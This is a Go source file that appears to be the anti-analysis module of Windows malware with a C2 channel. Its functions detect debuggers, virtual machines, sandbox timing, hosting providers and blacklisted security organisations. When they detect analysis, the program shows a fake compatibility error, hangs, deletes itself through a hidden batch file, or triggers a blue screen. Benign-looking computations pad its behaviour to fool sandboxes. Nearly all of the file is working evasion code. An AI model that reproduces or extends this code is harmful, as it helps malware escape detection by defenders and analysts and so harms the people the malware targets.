//TODO:

package core

import (
	"bytes"
	"io/ioutil"
	"math"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"syscall"
	"time"
)

//- Smart Anti-Forensics & Anti-Detection
//		Strings Obfuscated
//		Dynamic Library Calling with Obfuscated Names
//		Random Memory Allocation
//		Random Connection Times
//		Random C2 File Paths, Parameters and Anchors
//		Client <-> C2 Data Encrypted
//		Function HOPPING
//		Smart Delay System
//			Set Time after first run to start doing work
//			Set Event to start doing work (USB plugged in, Browser open, etc)
//			User Activity
//		Smart Anti-VM
//			Detect Process, Debugger, IP's, File Names
//			Reaction System
//				Run a simple program that's 'broken'
//				Random Error message
//				Self-Destruct (Deletes self and all files, clears any history it can.)

func ActiveAntiForensics() {
	for {
		var alarmTime = time.Duration(randInt(30, 300)) * time.Second
		Ring := time.NewTicker(alarmTime)
		select {
		case <-Ring.C:
			if DetectHashedName() || DetectDebugger() || DetectRemoteDebugger() || DetectProcesses() || DetectOrganizations() || DetectHosting() || DetectVM() {
				if AntiForensicsResponse == 0 {
					MessageBox(os.Args[0], "The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.", 0x00000010)
					os.Exit(111)
				} else if AntiForensicsResponse == 1 {
					os.Exit(19)
				} else if AntiForensicsResponse == 2 {
					for {
						time.Sleep(5 * time.Second)
					}
				} else if AntiForensicsResponse == 3 {
					err := CreateFileAndWriteData(os.Getenv("APPDATA")+"\\remove.bat", []byte(`ping 1.1.1.1 -n 1 -w 4000 > Nul & Del "`+os.Args[0]+`" > Nul & del "%~f0"`))
					if err == nil {
						cmd := exec.Command("cmd", "/C", os.Getenv("APPDATA")+"\\remove.bat")
						cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						cmd.Start()
						os.Exit(69)
					}
				} else if AntiForensicsResponse == 4 {
					TriggerBSOD()
				}
			}
		}
	}
}

func DetectHashedName() bool { //Check the file name, See if its a HASH
	match, _ := regexp.MatchString("[a-f0-9]{32}", os.Args[0])
	return match
}

func DetectRemoteDebugger() bool {
	me, _ := syscall.GetCurrentProcess()
	Flag, _, _ := procIsDebuggerPresent.Call(uintptr(me))
	if Flag != 0 {
		return true
	}
	return false
}

func DetectDebugger() bool {
	Flag, _, _ := procIsDebuggerPresent.Call()
	if Flag != 0 {
		return true
	}
	return false
}

func DetectHosting() bool {
	rsp, _ := http.Get("http://ip-api.com/line/?fields=hosting")
	if rsp.StatusCode == 200 {
		defer rsp.Body.Close()
		buf, _ := ioutil.ReadAll(rsp.Body)
		if string(bytes.TrimSpace(buf)) == "true" {
			return true
		}
	}
	return false
}

func DetectOrganizations() bool {
	finished, _, _, _, _, Org := GEOIP()
	if finished {
		for _, v := range BlacklistOrganizations {
			if strings.Contains(strings.ToLower(Org), strings.ToLower(v)) {
				return true
			}
		}
	}
	return false
}

func DetectCountry() bool {
	finished, Country, _, _, _, _ := GEOIP()
	if finished {
		for _, v := range BlacklistCountries {
			if strings.Contains(strings.ToLower(Country), strings.ToLower(v)) {
				return true
			}
		}
	}
	return false
}

func DetectProcesses() bool {
	for i := 0; i < len(HostileProcesses); i++ {
		if CheckForProcess(HostileProcesses[i]) {
			return true
		}
		time.Sleep(50 * time.Millisecond)
	}
	return false
}

func DetectVM() bool {
	output := IssuePowershell("Get-WmiObject Win32_PortConnector")
	if len(output) <= 3 {
		return true
	}

	output = IssuePowershell("Get-WmiObject Win32_ComputerSystem")
	if strings.Contains(output, "VIRTUAL") || strings.Contains(output, "vmware") || strings.Contains(output, "VirtualBox") {
		return true
	}

	output = IssuePowershell("Get-WmiObject Win32_VideoController")
	if strings.Contains(output, "VMware") || strings.Contains(output, "VBox") {
		return true
	}

	for _, v := range BlacklistMacs {
		if strings.HasPrefix(getMacAddr()[0], v) {
			return true
		}
	}

	initTime := time.Now()
	time.Sleep(500 * time.Millisecond)
	if TimeDifference(initTime, 2) {
		return true
	}

	return false
}

func TimeDifference(initTime time.Time, maxTimeAllowed int) bool {
	return time.Since(initTime) > time.Duration(maxTimeAllowed)*time.Second
}

func LetsPlaySomeGames() bool {
	time.Sleep(1 * time.Second)
	prime := PrimeSieve()
	time.Sleep(1 * time.Second)
	life := GameOfLife()
	time.Sleep(1 * time.Second)
	go Pi(5000)
	if prime && life {
		return true
	}
	return false
}

func PrimeSieve() bool {
	ch := make(chan int)
	go Generate(ch)
	for i := 0; i < 10; i++ {
		prime := <-ch
		ch1 := make(chan int)
		go Filter(ch, ch1, prime)
		ch = ch1
	}
	return true
}

func GameOfLife() bool {
	l := NewLife(40, 15)
	for i := 0; i < 300; i++ {
		l.Step()
		time.Sleep(time.Second / 30)
	}
	return true
}

func Pi(n int) float64 {
	ch := make(chan float64)
	for k := 0; k < n; k++ {
		go term(ch, float64(k))
	}
	f := 0.0
	for k := 0; k < n; k++ {
		f += <-ch
	}
	return f
}

func Generate(ch chan<- int) {
	for i := 2; ; i++ {
		ch <- i
	}
}

func Filter(in <-chan int, out chan<- int, prime int) {
	for {
		i := <-in
		if i%prime != 0 {
			out <- i
		}
	}
}

func term(ch chan float64, k float64) {
	ch <- 4 * math.Pow(-1, k) / (2*k + 1)
}

func NewField(w, h int) *Field {
	s := make([][]bool, h)
	for i := range s {
		s[i] = make([]bool, w)
	}
	return &Field{s: s, w: w, h: h}
}

func (f *Field) Set(x, y int, b bool) {
	f.s[y][x] = b
}

func (f *Field) Alive(x, y int) bool {
	x += f.w
	x %= f.w
	y += f.h
	y %= f.h
	return f.s[y][x]
}

func (f *Field) Next(x, y int) bool {
	alive := 0
	for i := -1; i <= 1; i++ {
		for j := -1; j <= 1; j++ {
			if (j != 0 || i != 0) && f.Alive(x+i, y+j) {
				alive++
			}
		}
	}
	return alive == 3 || alive == 2 && f.Alive(x, y)
}

func NewLife(w, h int) *Life {
	a := NewField(w, h)
	for i := 0; i < (w * h / 4); i++ {
		a.Set(rand.Intn(w), rand.Intn(h), true)
	}
	return &Life{
		a: a, b: NewField(w, h),
		w: w, h: h,
	}
}

func (l *Life) Step() {
	for y := 0; y < l.h; y++ {
		for x := 0; x < l.w; x++ {
			l.b.Set(x, y, l.a.Next(x, y))
		}
	}
	l.a, l.b = l.b, l.a
}

func (l *Life) String() string {
	var buf bytes.Buffer
	for y := 0; y < l.h; y++ {
		for x := 0; x < l.w; x++ {
			b := byte(' ')
			if l.a.Alive(x, y) {
				b = '*'
			}
			buf.WriteByte(b)
		}
		buf.WriteByte('\n')
	}
	return buf.String()
}

func getMacAddr() []string {
	ifas, _ := net.Interfaces()

	var as []string
	for _, ifa := range ifas {
		a := ifa.HardwareAddr.String()
		if a != "" {
			as = append(as, a)
		}
	}
	return as
}
